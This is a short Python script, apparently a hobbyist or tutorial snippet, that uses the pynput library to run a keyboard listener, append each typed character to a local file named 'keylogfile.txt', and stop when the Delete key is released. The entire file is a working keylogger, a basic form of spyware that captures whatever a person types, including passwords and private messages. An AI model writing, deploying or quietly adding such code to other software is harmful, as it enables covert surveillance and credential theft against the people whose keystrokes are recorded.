from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylogfile.txt",'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error getting char")

def keyReleased(key):
    if key == keyboard.Key.delete:
        listener.stop()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed,on_release=keyReleased)
    listener.start()

    input()